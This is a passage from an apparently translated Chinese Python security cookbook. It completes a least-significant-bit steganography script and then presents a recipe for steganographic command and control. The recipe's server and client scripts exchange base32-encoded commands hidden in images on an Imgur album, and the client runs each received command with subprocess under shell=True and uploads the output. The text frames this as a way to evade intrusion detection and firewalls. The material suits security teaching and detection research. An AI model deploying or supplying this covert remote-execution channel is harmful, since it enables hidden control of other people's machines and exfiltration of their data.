        return '1'
```

接下来，我们有我们的主要`extract_message`函数。这需要我们载体图像的文件名：

```py
def extract_message(carrier):
```

然后，我们从传入的文件名创建一个图像对象，然后从图像数据创建一个像素数组。我们还创建一个名为`message`的空字符串；这将保存我们提取的文本：

```py
c_image = Image.open(carrier)
pixel_list = list(c_image.getdata())
message = ""
```

接下来，我们创建一个`for`循环，它将迭代使用我们的辅助函数“get_pixel_pairs”返回的所有像素对；我们将返回的对设置为`pix1`和“pix2”：

```py
for pix1, pix2 in get_pixel_pairs(pixel_list):
```

我们将创建的代码的下一部分是一个字符串变量，它将保存我们的二进制字符串。Python 通过`0b`前缀知道它将是字符串的二进制表示。然后，我们迭代每个像素（`pix1`和`pix2`）中的`RGBA`值，并将该值传递给我们的辅助函数`get_LSB`，返回的值将附加到我们的二进制字符串上：

```py
message_byte = "0b"
for p in pix1:
    message_byte += get_LSB(p)
for p in pix2:
    message_byte += get_LSB(p)
```

当前面的代码运行时，我们将得到一个字符的二进制表示的字符串。字符串看起来像这样`0b01100111`，我们在隐藏的消息末尾放置了一个停止字符，将是`0x00`，当提取部分输出时，我们需要跳出`for`循环，因为我们知道已经到达了隐藏文本的末尾。下一部分为我们进行了检查：

```py
if message_byte == "0b00000000":
            break
```

如果不是我们的停止字节，那么我们可以将字节转换为其原始字符，并将其附加到我们的消息字符串的末尾：

```py
message += chr(int(message_byte,2))
```

剩下的就是从函数中返回完整的消息字符串。

## 还有更多…

现在我们有了隐藏和提取函数，我们可以将它们放在一起成为一个类，我们将在下一个配方中使用。我们将添加一个检查，以测试该类是否已被其他类使用，或者是否正在独立运行。整个脚本如下。`hide`和`extract`函数已经稍作修改，以接受图像 URL；此脚本将在第八章的 C2 示例中使用，*负载和外壳*：

```py
#!/usr/bin/env python

import sys
import urllib
import cStringIO

from optparse import OptionParser
from PIL import Image
from itertools import izip

def get_pixel_pairs(iterable):
    a = iter(iterable)
    return izip(a, a)

def set_LSB(value, bit):
    if bit == '0':
        value = value & 254
    else:
        value = value | 1
    return value

def get_LSB(value):
    if value & 1 == 0:
        return '0'
    else:
        return '1'

def extract_message(carrier, from_url=False):
    if from_url:
        f = cStringIO.StringIO(urllib.urlopen(carrier).read())
        c_image = Image.open(f)
    else:
        c_image = Image.open(carrier)

    pixel_list = list(c_image.getdata())
    message = ""

    for pix1, pix2 in get_pixel_pairs(pixel_list):
        message_byte = "0b"
        for p in pix1:
            message_byte += get_LSB(p)

        for p in pix2:
            message_byte += get_LSB(p)

        if message_byte == "0b00000000":
            break

        message += chr(int(message_byte,2))
    return message

def hide_message(carrier, message, outfile, from_url=False):
    message += chr(0)
    if from_url:
        f = cStringIO.StringIO(urllib.urlopen(carrier).read())
        c_image = Image.open(f)
    else:
        c_image = Image.open(carrier)

    c_image = c_image.convert('RGBA')

    out = Image.new(c_image.mode, c_image.size)
    width, height = c_image.size
    pixList = list(c_image.getdata())
    newArray = []

    for i in range(len(message)):
        charInt = ord(message[i])
        cb = str(bin(charInt))[2:].zfill(8)
        pix1 = pixList[i*2]
        pix2 = pixList[(i*2)+1]
        newpix1 = []
        newpix2 = []

        for j in range(0,4):
            newpix1.append(set_LSB(pix1[j], cb[j]))
            newpix2.append(set_LSB(pix2[j], cb[j+4]))

        newArray.append(tuple(newpix1))
        newArray.append(tuple(newpix2))

    newArray.extend(pixList[len(message)*2:])

    out.putdata(newArray)
    out.save(outfile)
    return outfile   

if __name__ == "__main__":

    usage = "usage: %prog [options] arg1 arg2"
    parser = OptionParser(usage=usage)
    parser.add_option("-c", "--carrier", dest="carrier",
                help="The filename of the image used as the carrier.",
                metavar="FILE")
    parser.add_option("-m", "--message", dest="message",
                help="The text to be hidden.",
                metavar="FILE")
    parser.add_option("-o", "--output", dest="output",
                help="The filename the output file.",
                metavar="FILE")
    parser.add_option("-e", "--extract",
                action="store_true", dest="extract", default=False,
                help="Extract hidden message from carrier and save to output filename.")
    parser.add_option("-u", "--url",
                action="store_true", dest="from_url", default=False,
                help="Extract hidden message from carrier and save to output filename.")

    (options, args) = parser.parse_args()
    if len(sys.argv) == 1:
        print "TEST MODE\nHide Function Test Starting ..."
        print hide_message('carrier.png', 'The quick brown fox jumps over the lazy dogs back.', 'messagehidden.png')
        print "Hide test passed, testing message extraction ..."
        print extract_message('messagehidden.png')
    else:
        if options.extract == True:
            if options.carrier is None:
                parser.error("a carrier filename -c is required for extraction")
            else:
                print extract_message(options.carrier, options.from_url)
        else:
            if options.carrier is None or options.message is None or options.output is None:
                parser.error("a carrier filename -c, message filename -m and output filename -o are required for steg")
            else:
                hide_message(options.carrier, options.message, options.output, options.from_url)
```

# 使用隐写术启用命令和控制

这个配方将展示隐写术如何被用来控制另一台机器。如果您试图规避入侵检测系统（IDS）/防火墙，这可能会很方便。在这种情况下，唯一可见的流量是来自客户机的 HTTPS 流量。这个配方将展示一个基本的服务器和客户端设置。

## 准备工作

在这个配方中，我们将使用图像分享网站 Imgur 来托管我们的图像。这样做的原因很简单，即 Imgur 的 Python API 易于安装且易于使用。您也可以选择使用其他网站。但是，如果您希望使用此脚本，您需要在 Imgur 上创建一个帐户，并注册一个应用程序以获取 API 密钥和密钥。完成后，您可以使用`pip`安装`imgur` Python 库：

```py
$ pip install imgurpython

```

您可以在[`www.imgur.com`](http://www.imgur.com)注册一个帐户。

注册账户后，您可以注册一个应用程序，以从[`api.imgur.com/oauth2/addclient`](https://api.imgur.com/oauth2/addclient)获取 API 密钥和密钥。

一旦您拥有 imgur 账户，您需要创建一个相册并将图像上传到其中。

这个步骤将从上一个步骤中导入完整的隐写文本脚本。

## 操作步骤…

这个步骤的工作方式分为两部分。我们将有一个脚本作为服务器运行和操作，另一个脚本作为客户端运行和操作。我们的脚本将遵循的基本步骤如下所述：

1.  运行服务器脚本。

1.  服务器等待客户端宣布它已准备就绪。

1.  运行客户端脚本。

1.  客户端通知服务器它已准备就绪。

1.  服务器显示客户端正在等待，并提示用户发送到客户端的命令。

1.  服务器发送一个命令。

1.  服务器等待响应。

1.  客户端接收命令并运行它。

1.  客户端发送命令的输出回到服务器。

1.  服务器接收来自客户端的输出并显示给用户。

1.  步骤 5 到 10 将重复执行，直到发送`quit`命令。

考虑到这些步骤，让我们首先看一下服务器脚本：

```py
from imgurpython import ImgurClient
import StegoText, random, time, ast, base64

def get_input(string):
    ''' Get input from console regardless of python 2 or 3 '''
    try:
        return raw_input(string)
    except:
        return input(string)

def create_command_message(uid, command):
    command = str(base64.b32encode(command.replace('\n','')))
    return "{'uuid':'" + uid + "','command':'" + command + "'}"

def send_command_message(uid, client_os, image_url):
    command = get_input(client_os + "@" + uid + ">")
    steg_path = StegoText.hide_message(image_url, create_command_message(uid, command), "Imgur1.png", True)
    print "Sending command to client ..."
    uploaded = client.upload_from_path(steg_path)
    client.album_add_images(a[0].id, uploaded['id'])

    if command == "quit":
        sys.exit()

    return uploaded['datetime']

def authenticate():
    client_id = '<REPLACE WITH YOUR IMGUR CLIENT ID>'
    client_secret = '<REPLACE WITH YOUR IMGUR CLIENT SECRET>'

    client = ImgurClient(client_id, client_secret)
    authorization_url = client.get_auth_url('pin')

    print("Go to the following URL: {0}".format(authorization_url))
    pin = get_input("Enter pin code: ")

    credentials = client.authorize(pin, 'pin')
    client.set_user_auth(credentials['access_token'], credentials['refresh_token'])

    return client

client = authenticate()
a = client.get_account_albums("C2ImageServer")

imgs = client.get_album_images(a[0].id)
last_message_datetime = imgs[-1].datetime

print "Awaiting client connection ..."

loop = True
while loop:
    time.sleep(5)
    imgs = client.get_album_images(a[0].id)
    if imgs[-1].datetime > last_message_datetime:
        last_message_datetime = imgs[-1].datetime
        client_dict =  ast.literal_eval(StegoText.extract_message(imgs[-1].link, True))
        if client_dict['status'] == "ready":
            print "Client connected:\n"
            print "Client UUID:" + client_dict['uuid']
            print "Client OS:" + client_dict['os']
        else:
            print base64.b32decode(client_dict['response'])

        random.choice(client.default_memes()).link
        last_message_datetime = send_command_message(client_dict['uuid'],
        client_dict['os'],
        random.choice(client.default_memes()).link)
```

以下是我们的客户端脚本：

```py
from imgurpython import ImgurClient
import StegoText
import ast, os, time, shlex, subprocess, base64, random, sys

def get_input(string):
    try:
        return raw_input(string)
    except:
        return input(string)

def authenticate():
    client_id = '<REPLACE WITH YOUR IMGUR CLIENT ID>'
    client_secret = '<REPLACE WITH YOUR IMGUR CLIENT SECRET>'

    client = ImgurClient(client_id, client_secret)
    authorization_url = client.get_auth_url('pin')

    print("Go to the following URL: {0}".format(authorization_url))
    pin = get_input("Enter pin code: ")

    credentials = client.authorize(pin, 'pin')
    client.set_user_auth(credentials['access_token'], credentials['refresh_token'])

    return client

client_uuid = "test_client_1"

client = authenticate()
a = client.get_account_albums("<YOUR IMGUR USERNAME>")

imgs = client.get_album_images(a[0].id)
last_message_datetime = imgs[-1].datetime

steg_path = StegoText.hide_message(random.choice(client.default_memes()). link,  "{'os':'" + os.name + "', 'uuid':'" + client_uuid + "','status':'ready'}",  "Imgur1.png",True)
uploaded = client.upload_from_path(steg_path)
client.album_add_images(a[0].id, uploaded['id'])
last_message_datetime = uploaded['datetime']

while True:

    time.sleep(5) 
    imgs = client.get_album_images(a[0].id)
    if imgs[-1].datetime > last_message_datetime:
        last_message_datetime = imgs[-1].datetime
        client_dict =  ast.literal_eval(StegoText.extract_message(imgs[-1].link, True))
        if client_dict['uuid'] == client_uuid:
            command = base64.b32decode(client_dict['command'])

            if command == "quit":
                sys.exit(0)

            args = shlex.split(command)
            p = subprocess.Popen(args, stdout=subprocess.PIPE, shell=True)
            (output, err) = p.communicate()
            p_status = p.wait()

            steg_path = StegoText.hide_message(random.choice (client.default_memes()).link,  "{'os':'" + os.name + "', 'uuid':'" + client_uuid + "','status':'response', 'response':'" + str(base64.b32encode(output)) + "'}", "Imgur1.png", True)
            uploaded = client.upload_from_path(steg_path)
            client.album_add_images(a[0].id, uploaded['id'])
            last_message_datetime = uploaded['datetime']
```

## 工作原理…

首先，我们创建一个`imgur`客户端对象；authenticate 函数处理将`imgur`客户端与我们的账户和应用程序进行身份验证。当您运行脚本时，它将输出一个 URL，让您访问以获取 PIN 码输入。然后，它会获取我们的 imgur 用户名的相册列表。如果您还没有创建相册，脚本将失败，所以请确保您已经准备好相册。我们将获取列表中的第一个相册，并获取该相册中包含的所有图像的进一步列表。

图像列表按照最早上传的图像排列；为了使我们的脚本工作，我们需要知道最新上传图像的时间戳，所以我们使用`[-1]`索引来获取它并将其存储在一个变量中。完成这些步骤后，服务器将等待客户端连接：

```py
client = authenticate()
a = client.get_account_albums("<YOUR IMGUR ACCOUNT NAME>")

imgs = client.get_album_images(a[0].id)
last_message_datetime = imgs[-1].datetime

print "Awaiting client connection ..."
```

一旦服务器等待客户端连接，我们就可以运行客户端脚本。客户端脚本的初始启动创建了一个`imgur`客户端对象，就像服务器一样，但不是等待；相反，它生成一条消息并将其隐藏在一个随机图像中。这条消息包含客户端正在运行的`os`类型（这将使服务器用户更容易知道要运行什么命令），一个`ready`状态，以及客户端的标识符（如果您想扩展脚本以允许多个客户端连接到服务器）。

一旦图像上传完成，`last_message_datetime`函数就会设置为新的时间戳：

```py
client_uuid = "test_client_1"

client = authenticate()
a = client.get_account_albums("C2ImageServer")

imgs = client.get_album_images(a[0].id)
last_message_datetime = imgs[-1].datetime

steg_path = StegoText.hide_message(random.choice (client.default_memes()).link,  "{'os':'" + os.name + "', 'uuid':'" + client_uuid + "','status':'ready'}",  "Imgur1.png",True)
uploaded = client.upload_from_path(steg_path)
client.album_add_images(a[0].id, uploaded['id'])
last_message_datetime = uploaded['datetime']
```

服务器将等待直到看到消息；它通过使用`while`循环来做到这一点，并检查比启动时保存的图像日期时间晚的图像。一旦看到有新的图像，它将下载并提取消息。然后检查消息是否是客户端准备好的消息；如果是，它会显示`uuid`客户端和`os`类型，然后提示用户输入：

```py
loop = True
while loop:
    time.sleep(5)
    imgs = client.get_album_images(a[0].id)
    if imgs[-1].datetime > last_message_datetime:
        last_message_datetime = imgs[-1].datetime
        client_dict = ast.literal_eval(StegoText.extract_message(imgs[-1].link, True))
        if client_dict['status'] == "ready":
            print "Client connected:\n"
            print "Client UUID:" + client_dict['uuid']
            print "Client OS:" + client_dict['os']
```

用户输入命令后，它会使用 base32 对其进行编码，以避免破坏我们的消息字符串。然后将其隐藏在一个随机图像中，并上传到 imgur。客户端坐在一个循环中等待这条消息。这个循环的开始方式与我们的服务器相同；如果它看到一个新的图像，它会检查是否使用`uuid`寻址到这台机器，如果是，它将提取消息，将其转换为`Popen`将接受的友好格式，然后使用`Popen`运行命令。然后等待命令的输出，然后将其隐藏在一个随机图像中并上传到 imgur：

```py
loop = True
while loop:

    time.sleep(5) 
    imgs = client.get_album_images(a[0].id)
    if imgs[-1].datetime > last_message_datetime:
        last_message_datetime = imgs[-1].datetime
        client_dict =  ast.literal_eval(StegoText.extract_message(imgs[-1].link, True))
        if client_dict['uuid'] == client_uuid:
            command = base64.b32decode(client_dict['command'])

            if command == "quit":
                sys.exit(0)

            args = shlex.split(command)
            p = subprocess.Popen(args, stdout=subprocess.PIPE, shell=True)
            (output, err) = p.communicate()
            p_status = p.wait()

            steg_path = StegoText.hide_message(random.choice (client.default_memes()).link,  "{'os':'" + os.name + "', 'uuid':'" + client_uuid + "','status':'response', 'response':'" + str(base64.b32encode(output)) + "'}",  "Imgur1.png", True)
            uploaded = client.upload_from_path(steg_path)
            client.album_add_images(a[0].id, uploaded['id'])
            last_message_datetime = uploaded['datetime']
```

服务器所需做的就是获取新图像，提取隐藏的输出，并将其显示给用户。然后它会给出一个新的提示，等待下一个命令。就是这样；这是一种非常简单的通过隐写术传递命令和控制数据的方法。
